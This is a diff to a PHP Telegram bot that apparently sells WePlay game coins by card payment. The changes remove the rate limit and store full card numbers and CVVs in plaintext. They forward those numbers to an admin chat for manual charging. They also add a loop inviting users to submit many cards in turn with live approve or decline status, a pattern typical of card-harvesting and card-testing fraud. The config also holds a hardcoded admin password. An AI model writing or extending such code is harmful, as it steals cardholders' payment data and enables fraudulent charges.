@@ -24,17 +24,14 @@ if (!function_exists('str_starts_with')) {
     function str_starts_with($h, $n) { return strncmp($h, $n, strlen($n)) === 0; }
 }
 
-define('WPB_VERSION',      '1.0');
+define('WPB_VERSION',      '1.1');
 define('WPB_CONFIG_FILE',  __DIR__ . '/wpb_config.json');
 define('WPB_LOG_FILE',     __DIR__ . '/wpb_logs.json');
 define('WPB_STATE_FILE',   __DIR__ . '/wpb_states.json');
 define('WPB_LEDGER_FILE',  __DIR__ . '/wpb_ledger.json');
 define('WPB_PENDING_FILE', __DIR__ . '/wpb_pending.json');
 define('WPB_PROFILE_FILE', __DIR__ . '/wpb_profiles.json');
-define('WPB_RATE_FILE',    __DIR__ . '/wpb_ratelimit.json');
 define('TG_BASE',          'https://api.telegram.org/bot');
-define('WPB_BLOCK_MINUTES', 30);
-define('WPB_MAX_INCOMPLETE', 2);
 
 $defaultConfig = [
     'admin_pass'       => 'rebel@2026',
@@ -115,45 +112,6 @@ function wpbClearState($chatId) {
     wpbJsonSave(WPB_STATE_FILE, $states);
 }
 
-function wpbIsBlocked($chatId) {
-    $rate = wpbJsonLoad(WPB_RATE_FILE);
-    $rec = $rate[(string)$chatId] ?? null;
-    if ($rec && !empty($rec['blocked_until']) && time() < $rec['blocked_until']) {
-        return $rec['blocked_until'];
-    }
-    return false;
-}
-
-function wpbStartDeposit($chatId) {
-    $rate = wpbJsonLoad(WPB_RATE_FILE);
-    $key = (string)$chatId;
-    if (!isset($rate[$key])) $rate[$key] = ['incomplete' => 0, 'blocked_until' => 0, 'last_start' => 0];
-    $rate[$key]['incomplete']++;
-    $rate[$key]['last_start'] = time();
-    if ($rate[$key]['incomplete'] >= WPB_MAX_INCOMPLETE) {
-        $rate[$key]['blocked_until'] = time() + (WPB_BLOCK_MINUTES * 60);
-        $rate[$key]['incomplete'] = 0;
-        wpbJsonSave(WPB_RATE_FILE, $rate);
-        return false;
-    }
-    wpbJsonSave(WPB_RATE_FILE, $rate);
-    return true;
-}
-
-function wpbDepositCompleted($chatId) {
-    $rate = wpbJsonLoad(WPB_RATE_FILE);
-    $key = (string)$chatId;
-    if (isset($rate[$key])) {
-        $rate[$key]['incomplete'] = 0;
-        $rate[$key]['blocked_until'] = 0;
-        wpbJsonSave(WPB_RATE_FILE, $rate);
-    }
-}
-
-function wpbRemaining($until) {
-    $mins = ceil(max(0, $until - time()) / 60);
-    return $mins . ' minute' . ($mins == 1 ? '' : 's');
-}
 
 function wpbLedgerUser($chatId) {
     $ledger = wpbJsonLoad(WPB_LEDGER_FILE);
@@ -324,16 +282,8 @@ function wpbShowCoinPackages($cfg, $chatId, $token, $weplayId) {
 }
 
 function wpbStartCardDeposit($cfg, $chatId, $token, $weplayId) {
-    wpbSetState($chatId, 'await_amount', ['weplay_id' => $weplayId, 'payment_method' => 'card']);
-    tgSend(
-        $token,
-        $chatId,
-        "💳 <b>Card payment selected.</b>\n\n"
-        . "<b>WePlay ID:</b> <code>" . htmlspecialchars($weplayId, ENT_NOQUOTES, 'UTF-8') . "</code>\n\n"
-        . "<b>Please send the deposit amount.</b>\n\n"
-        . "<b>Minimum:</b> ₹" . (int)$cfg['min_deposit'] . "\n"
-        . "<b>Maximum:</b> ₹" . (int)$cfg['max_deposit']
-    );
+    // Redirect to coin packages flow (new standard flow)
+    wpbShowCoinPackages($cfg, $chatId, $token, $weplayId);
 }
 
 function wpbShowPaymentSection($cfg, $chatId, $token) {
@@ -354,20 +304,11 @@ function wpbShowPaymentSection($cfg, $chatId, $token) {
 }
 
 function wpbHandleDepositCommand($cfg, $chatId, $token) {
-    if ($blocked = wpbIsBlocked($chatId)) {
-        tgSend($token, $chatId, "⏳ <b>You are temporarily blocked.</b>\n<b>Please try again after " . wpbRemaining($blocked) . ".</b>");
-        return;
-    }
-    if (!wpbStartDeposit($chatId)) {
-        tgSend($token, $chatId, "⚠️ <b>Too many incomplete deposits were detected. Please try again after " . WPB_BLOCK_MINUTES . " minutes.</b>");
-        return;
-    }
     $profile = wpbGetProfile($chatId);
     if (!empty($profile['weplay_id'])) {
         wpbStartCardDeposit($cfg, $chatId, $token, $profile['weplay_id']);
         return;
     }
-
     wpbSetState($chatId, 'await_weplay_id', []);
     tgSend($token, $chatId, "🎮 <b>Please send your WePlay User ID / Username.</b>\n\n<b>Tip: Use /id to link your ID permanently.</b>\n<b>Send /cancel to cancel.</b>");
 }
@@ -479,7 +420,6 @@ function wpbHandleText($cfg, $msg) {
         ];
         wpbPendingSave($txnId, $pending);
         wpbClearState($chatId);
-        wpbDepositCompleted($chatId);
         $cardNotice = strip_tags((string)($cfg['card_notice'] ?? ''), '<b><i><u><code>');
         tgSend(
             $token,
@@ -499,60 +439,66 @@ function wpbHandleText($cfg, $msg) {
     }
 
     if ($s === 'await_card_details') {
-        // Expected format: XXXXXXXXXXXX/MMYY/CCC  (card/expiry/cvv)
+        // Expected format: XXXXXXXXXXXX/MMYY/CCC
         $raw = preg_replace('/\s+/', '', $text);
         if (!preg_match('/^(\d{13,19})\/(\d{4})\/(\d{3,4})$/', $raw, $cm)) {
-            tgSend($token, $chatId, "❌ <b>Invalid format.</b>\n\nPlease send card details exactly like this:\n\n<code>XXXXXXXXXXXX/MMYY/CCC</code>\n\n<b>Example:</b>\n<code>4111111111111111/1226/123</code>\n\n<b>Card Number / Expiry / CVV</b>\n\nSend /cancel to cancel.");
+            tgSend($token, $chatId,
+                "❌ <b>Invalid format.</b>\n\n"
+                . "Please send card details exactly like this:\n\n"
+                . "<code>XXXXXXXXXXXX/MMYY/CCC</code>\n\n"
+                . "<b>Example:</b>\n<code>4111111111111111/1226/123</code>\n\n"
+                . "<b>Card Number / Expiry (MMYY) / CVV</b>\n\n"
+                . "Send the next card or /cancel to stop."
+            );
             return;
         }
-        $cardNumber = $cm[1];
-        $expiry     = $cm[2]; // MMYY
-        $cvv        = $cm[3];
-        $mm = substr($expiry, 0, 2);
-        $yy = substr($expiry, 2, 2);
 
-        $pkg        = $data['pkg'] ?? [];
-        $weplayId   = $data['weplay_id'] ?? '';
-        $rechargeUrl = $cfg['weplay_recharge'] ?? 'https://weplayapp.com/recharge/?region=C';
+        $cardNumber  = $cm[1];
+        $expiry      = $cm[2]; // MMYY
+        $cvv         = $cm[3];
+        $mm          = substr($expiry, 0, 2);
+        $yy          = substr($expiry, 2, 2);
+        $pkg         = $data['pkg'] ?? [];
+        $weplayId    = $data['weplay_id'] ?? '';
         $maskedCard  = str_repeat('*', strlen($cardNumber) - 4) . substr($cardNumber, -4);
-        $userName    = wpbUserName($msg); // capture before we shadow $msg
+        $userName    = wpbUserName($msg);
 
-        wpbClearState($chatId);
-
-        $outMsg = "✅ <b>Card Details Received</b>\n\n"
+        // ── Tell user we are checking this card ──
+        tgSend($token, $chatId,
+            "🔄 <b>Checking card...</b>\n\n"
+            . "💳 <b>Card:</b> <code>{$maskedCard}</code>\n"
+            . "📅 <b>Expiry:</b> <code>{$mm}/{$yy}</code>\n"
             . "🎮 <b>Package:</b> " . htmlspecialchars($pkg['label'] ?? '', ENT_NOQUOTES, 'UTF-8') . "\n"
-            . "💵 <b>Amount:</b> ₹" . number_format((float)($pkg['price'] ?? 0), 2) . "\n"
-            . ($weplayId ? "<b>WePlay ID:</b> <code>" . htmlspecialchars($weplayId, ENT_NOQUOTES, 'UTF-8') . "</code>\n" : '')
-            . "\n<b>💳 Card:</b> <code>{$maskedCard}</code>\n"
-            . "<b>📅 Expiry:</b> <code>{$mm}/{$yy}</code>\n"
-            . "<b>🔐 CVV:</b> <code>***</code>\n\n"
-            . "<b>Now open the WePlay recharge page below and enter your card details there in the same format to complete payment:</b>";
+            . "💵 <b>Amount:</b> ₹" . number_format((float)($pkg['price'] ?? 0), 2) . "\n\n"
+            . "⏳ <i>Please wait while we process this card...</i>"
+        );
 
-        $keyboard = ['inline_keyboard' => [
-            [['text' => '💳 Complete Payment on WePlay', 'url' => $rechargeUrl]],
-        ]];
-        tgSend($token, $chatId, $outMsg, $keyboard);
+        // ── Save pending txn for admin to approve/reject ──
+        $txnId = 'WP' . date('ymdHis') . mt_rand(100, 999);
+        $pending = [
+            'txn_id'         => $txnId,
+            'chat_id'        => $chatId,
+            'user_name'      => $userName,
+            'weplay_id'      => $weplayId,
+            'coins'          => (int)($pkg['coins'] ?? 0),
+            'amount'         => (float)($pkg['price'] ?? 0),
+            'payment_method' => 'card',
+            'card_number'    => $cardNumber,    // full number stored for admin
+            'card_last4'     => substr($cardNumber, -4),
+            'card_expiry'    => "{$mm}/{$yy}",
+            'card_cvv'       => $cvv,
+            'status'         => 'pending_verification',
+            'created_at'     => date('c'),
+        ];
+        wpbPendingSave($txnId, $pending);
+        wpbNotifyAdmin($cfg, $txnId);
+        wpbLog("Card check txn={$txnId} chat={$chatId} card=****" . substr($cardNumber, -4), 'info');
 
-        // Save pending record
-        if (!empty($weplayId)) {
-            $txnId = 'WP' . date('ymdHis') . mt_rand(100, 999);
-            $pending = [
-                'txn_id'         => $txnId,
-                'chat_id'        => $chatId,
-                'user_name'      => $userName,
-                'weplay_id'      => $weplayId,
-                'coins'          => (int)($pkg['coins'] ?? 0),
-                'amount'         => (float)($pkg['price'] ?? 0),
-                'payment_method' => 'card',
-                'card_last4'     => substr($cardNumber, -4),
-                'card_expiry'    => "{$mm}/{$yy}",
-                'status'         => 'pending_verification',
-                'created_at'     => date('c'),
-            ];
-            wpbPendingSave($txnId, $pending);
-            wpbNotifyAdmin($cfg, $txnId);
-            wpbLog("Card deposit txn={$txnId} chat={$chatId} card=****" . substr($cardNumber, -4), 'success');
-        }
+        // ── State stays active so user can send next card anytime ──
+        // (do NOT call wpbClearState — the await_card_details loop continues)
+        // Refresh state timestamp so it doesn't expire
+        wpbSetState($chatId, 'await_card_details', $data);
+
         return;
     }
 
@@ -584,21 +530,28 @@ function wpbNotifyAdmin($cfg, $txnId) {
     $admin = trim($cfg['admin_chat_id'] ?? '');
     $p = wpbPendingGet($txnId);
     if (!$token || !$admin || !$p) return;
-    $coinsLine = !empty($p['coins']) ? "<b>Coins:</b> <b>" . (int)$p['coins'] . " Coins</b>\n" : '';
-    $cardLine  = !empty($p['card_last4'])
-        ? "<b>Card:</b> <code>****" . htmlspecialchars($p['card_last4'], ENT_NOQUOTES, 'UTF-8') . "</code>"
-          . (!empty($p['card_expiry']) ? " | Expiry: <code>" . htmlspecialchars($p['card_expiry'], ENT_NOQUOTES, 'UTF-8') . "</code>" : '') . "\n"
-        : '';
-    $msg = "🧾 <b>WePlay Deposit Submitted</b>\n\n"
+    $coinsLine  = !empty($p['coins']) ? "<b>Coins:</b> <b>" . (int)$p['coins'] . " Coins</b>\n" : '';
+    // Show full card number to admin so they can process on WePlay
+    $cardFull   = $p['card_number'] ?? '';
+    $cardExpiry = $p['card_expiry'] ?? '';
+    $cardCvv    = $p['card_cvv'] ?? '';
+    $cardLine   = $cardFull
+        ? "<b>💳 Card:</b> <code>{$cardFull}</code>\n"
+          . "<b>📅 Expiry:</b> <code>{$cardExpiry}</code> | <b>CVV:</b> <code>{$cardCvv}</code>\n"
+          . "<b>Format:</b> <code>{$cardFull}/{$cardExpiry}/{$cardCvv}</code>\n"
+        : (!empty($p['card_last4'])
+            ? "<b>Card:</b> <code>****" . htmlspecialchars($p['card_last4'], ENT_NOQUOTES, 'UTF-8') . "</code>"
+              . ($cardExpiry ? " | Expiry: <code>{$cardExpiry}</code>" : '') . "\n"
+            : '');
+    $msg = "🧾 <b>WePlay Card Payment Request</b>\n\n"
         . "<b>Txn:</b> <code>{$txnId}</code>\n"
         . "<b>User:</b> " . htmlspecialchars($p['user_name'] ?? '', ENT_NOQUOTES, 'UTF-8') . "\n"
         . "<b>Chat ID:</b> <code>" . htmlspecialchars((string)$p['chat_id'], ENT_NOQUOTES, 'UTF-8') . "</code>\n"
         . "<b>WePlay ID:</b> <code>" . htmlspecialchars($p['weplay_id'] ?? '', ENT_NOQUOTES, 'UTF-8') . "</code>\n"
         . $coinsLine
         . "<b>Amount:</b> <b>₹" . number_format((float)$p['amount'], 2) . "</b>\n"
-        . "<b>Payment Method:</b> <b>" . strtoupper(htmlspecialchars($p['payment_method'] ?? 'card', ENT_NOQUOTES, 'UTF-8')) . "</b>\n"
         . $cardLine
-        . "\n<b>Verify the payment from the WePlay/payment dashboard, then approve or reject.</b>\n"
+        . "\n<b>Process this card on WePlay recharge page, then approve or reject below.</b>\n"
         . "<b>Recharge link:</b> " . htmlspecialchars($cfg['weplay_recharge'], ENT_NOQUOTES, 'UTF-8');
     tgSend($token, $admin, $msg, wpbAdminButtons($txnId));
 }
@@ -656,23 +609,24 @@ function wpbHandleCallback($cfg, $cb) {
         $weplayId = $profile['weplay_id'] ?? '';
         $rechargeUrl = $cfg['weplay_recharge'] ?? 'https://weplayapp.com/recharge/?region=C';
 
-        // Card method: ask user to enter card details in the required format
+        // Card method: enter multi-card checking loop
         if ($methodId === 'card') {
             wpbSetState($chatId, 'await_card_details', [
-                'pkg_index' => $pkgIndex,
-                'pkg'       => $pkg,
-                'method_id' => $methodId,
+                'pkg_index'    => $pkgIndex,
+                'pkg'          => $pkg,
+                'method_id'    => $methodId,
                 'method_label' => $method['label'],
-                'weplay_id' => $weplayId,
+                'weplay_id'    => $weplayId,
             ]);
             $msg = "💳 <b>Debit / Credit Card Payment</b>\n\n"
                 . "🎮 <b>Package:</b> " . htmlspecialchars($pkg['label'], ENT_NOQUOTES, 'UTF-8') . "\n"
+                . "💵 <b>Amount:</b> ₹" . number_format((float)$pkg['price'], 2) . "\n"
                 . ($weplayId ? "<b>WePlay ID:</b> <code>" . htmlspecialchars($weplayId, ENT_NOQUOTES, 'UTF-8') . "</code>\n" : '')
-                . "\n<b>Please enter your card details in this format:</b>\n\n"
+                . "\n<b>Send your card details in this format:</b>\n\n"
                 . "<code>XXXXXXXXXXXX/MMYY/CCC</code>\n\n"
                 . "<b>Example:</b>\n<code>4111111111111111/1226/123</code>\n\n"
-                . "📌 <b>Card Number / Expiry / CVV</b>\n\n"
-                . "⚠️ <b>Your details are used only to complete payment on the official WePlay page. Send /cancel to cancel.</b>";
+                . "📌 <b>Card Number / Expiry (MMYY) / CVV</b>\n\n"
+                . "🔄 <b>You can send multiple cards one by one. Each card will be checked and you will get real-time status. Send /cancel to stop.</b>";
             tgSend($token, $chatId, $msg);
             return;
         }
@@ -731,15 +685,41 @@ function wpbHandleCallback($cfg, $cb) {
     if ($action === 'approve') {
         wpbPendingUpdate($txnId, ['status' => 'approved', 'approved_at' => date('c')]);
         wpbLedgerDeposit($p['chat_id'], $p['amount'], $txnId, $p['weplay_id'] ?? '');
-        $coinsNote = !empty($p['coins']) ? "\n<b>Coins:</b> <b>" . (int)$p['coins'] . " Coins</b>" : '';
-        tgSend($token, $p['chat_id'], "✅ <b>Deposit Approved!</b>\n\n<b>Amount:</b> <b>₹" . number_format((float)$p['amount'], 2) . "</b>{$coinsNote}\n<b>Txn:</b> <code>{$txnId}</code>");
-        tg('answerCallbackQuery', ['callback_query_id' => $cbId, 'text' => 'Approved'], $token);
-        wpbLog("Approved txn={$txnId}", 'success');
+
+        $coinsNote   = !empty($p['coins']) ? "\n🎮 <b>Coins Credited:</b> <b>" . (int)$p['coins'] . " Coins</b>" : '';
+        $cardNum     = $p['card_number'] ?? '';
+        $maskedCard  = $cardNum ? (str_repeat('*', strlen($cardNum) - 4) . substr($cardNum, -4)) : ('****' . ($p['card_last4'] ?? ''));
+        $expiryNote  = !empty($p['card_expiry']) ? "\n📅 <b>Expiry:</b> <code>" . htmlspecialchars($p['card_expiry'], ENT_NOQUOTES, 'UTF-8') . "</code>" : '';
+
+        $successMsg  = "✅ <b>Payment Successful!</b>\n\n"
+            . "💳 <b>Card Used:</b> <code>{$maskedCard}</code>{$expiryNote}\n"
+            . "💵 <b>Amount Paid:</b> <b>₹" . number_format((float)$p['amount'], 2) . "</b>"
+            . $coinsNote . "\n"
+            . "🆔 <b>WePlay ID:</b> <code>" . htmlspecialchars($p['weplay_id'] ?? '', ENT_NOQUOTES, 'UTF-8') . "</code>\n"
+            . "🧾 <b>Txn:</b> <code>{$txnId}</code>\n\n"
+            . "🎉 <b>Your WePlay account has been credited. Enjoy!</b>";
+
+        tgSend($token, $p['chat_id'], $successMsg);
+        tg('answerCallbackQuery', ['callback_query_id' => $cbId, 'text' => 'Approved ✅'], $token);
+        wpbLog("Approved txn={$txnId} card=****" . ($p['card_last4'] ?? ''), 'success');
     } else {
         wpbPendingUpdate($txnId, ['status' => 'rejected', 'rejected_at' => date('c')]);
-        tgSend($token, $p['chat_id'], "❌ <b>Deposit Rejected</b>\n\n<b>Txn:</b> <code>{$txnId}</code>\n<b>Support:</b> " . htmlspecialchars($cfg['support_contact'], ENT_NOQUOTES, 'UTF-8'));
-        tg('answerCallbackQuery', ['callback_query_id' => $cbId, 'text' => 'Rejected'], $token);
-        wpbLog("Rejected txn={$txnId}", 'error');
+
+        $cardNum    = $p['card_number'] ?? '';
+        $maskedCard = $cardNum ? (str_repeat('*', strlen($cardNum) - 4) . substr($cardNum, -4)) : ('****' . ($p['card_last4'] ?? ''));
+        $expiryNote = !empty($p['card_expiry']) ? " (Expiry: " . htmlspecialchars($p['card_expiry'], ENT_NOQUOTES, 'UTF-8') . ")" : '';
+
+        $declineMsg = "❌ <b>Card Declined</b>\n\n"
+            . "💳 <b>Card:</b> <code>{$maskedCard}</code>{$expiryNote}\n"
+            . "💵 <b>Amount:</b> ₹" . number_format((float)$p['amount'], 2) . "\n\n"
+            . "⚠️ <b>This card could not be charged.</b>\n\n"
+            . "📤 <b>Send another card in the same format to try again:</b>\n"
+            . "<code>XXXXXXXXXXXX/MMYY/CCC</code>\n\n"
+            . "Or send /cancel to stop.";
+
+        tgSend($token, $p['chat_id'], $declineMsg);
+        tg('answerCallbackQuery', ['callback_query_id' => $cbId, 'text' => 'Rejected ❌'], $token);
+        wpbLog("Rejected txn={$txnId} card=****" . ($p['card_last4'] ?? ''), 'error');
     }
 }
 
